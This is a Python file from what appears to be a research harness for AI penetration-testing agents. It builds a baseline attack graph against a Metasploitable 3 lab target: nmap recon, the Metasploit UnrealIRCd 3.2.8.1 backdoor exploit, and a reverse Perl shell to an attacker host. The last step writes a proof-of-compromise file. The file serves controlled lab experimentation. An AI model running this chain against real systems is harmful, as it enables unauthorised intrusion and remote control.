"""
Example Attack Graph: BASELINE IMPACT — no-fault chain with a deterministic
impact objective (Metasploitable 3).

This is the T1 smoke-test driver (experiment_plan.md §4): a completely normal chain
with NO injected fault, whose objective grounds DETERMINISTICALLY (an impact
write + read-back). It exists so T1 tests the no-fault happy path itself — not
privesc's kernel-exploit reliability (which is why goal_only, routing through
privesc, is the wrong T1 driver).

Chain: recon -> gain_access (opens a session) -> file_drop (impact objective).
No injection metadata, so the harness fault hook never fires and the graft is never
needed. The impact subagent upgrades the read-zombie shell to meterpreter and grounds
on the marker read-back.

Doubles as a no-fault control for the paper if wanted.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)

PROOF_MARKER = "PWNED_BASELINE_b2e8"
PROOF_FILE = "/tmp/pwned_baseline.txt"


def build_baseline_impact_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the UnrealIRCd "
                  "3.2.8.1 backdoor on port 6667, then drop a verified "
                  "proof-of-compromise file. (No-fault baseline: nothing is injected; "
                  "the chain should simply complete and ground the objective.)",
        target_ip=target_ip,
        name=f"baseline_impact_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="No-fault chain with a deterministic impact objective — the T1 "
                    "smoke driver / no-fault control.",
        metadata={"scenario": "baseline_impact", "target_type": "metasploitable3"},
    )

    graph.add_node(AttackNode(
        id="recon",
        label="Discover Attack Surface",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's open services and versions",
        objective=f"Discover open ports, services and versions on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -Pn -sV --top-ports 1000 -T4 {target_ip}"],
        max_retries=2,
        tags=["recon"],
    ))

    graph.add_node(AttackNode(
        id="gain_access",
        label="Gain Initial Access (UnrealIRCd backdoor)",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Open a command shell session on the target",
        objective=f"Gain an initial command shell on {target_ip} via the "
                  f"UnrealIRCd 3.2.8.1 backdoor on port 6667. LHOST={attacker_ip}.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        module_options={"RHOSTS": target_ip, "RPORT": 6667},
        payload="cmd/unix/reverse_perl",
        payload_options={"LHOST": attacker_ip, "LPORT": 4464},
        max_retries=3,
        tags=["initial_access", "unrealircd", "backdoor"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written, verified artifact",
        objective=(f"Write the exact marker '{PROOF_MARKER}' to {PROOF_FILE} on the "
                   f"target via the session, then read {PROOF_FILE} back to verify the "
                   f"write succeeded. The marker must appear in the read-back output."),
        target_ip=target_ip,
        tool_name="session",
        max_retries=3,
        metadata={"target_file": PROOF_FILE, "marker": PROOF_MARKER},
        tags=["impact", "file_drop", "proof", "objective"],
    ))

    graph.connect(
        "recon", "gain_access",
        checks=[EdgeCheck(field="success", operator="equals", expected="True",
                          description="Recon produced usable service data")],
        evidence="Recon mapped the attack surface",
        rationale="Attempt initial access via the UnrealIRCd backdoor",
    )
    graph.connect(
        "gain_access", "file_drop",
        checks=[EdgeCheck(field="session_id", operator="exists",
                          description="A live session is required to drop the file")],
        evidence="Initial session established",
        rationale="Drop the proof-of-compromise file over the session",
    )

    return graph


if __name__ == "__main__":
    graph = build_baseline_impact_graph(target_ip="192.168.34.7", attacker_ip="192.168.34.6")
    print(graph.summary())
    out_path = "examples/baseline_impact_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")
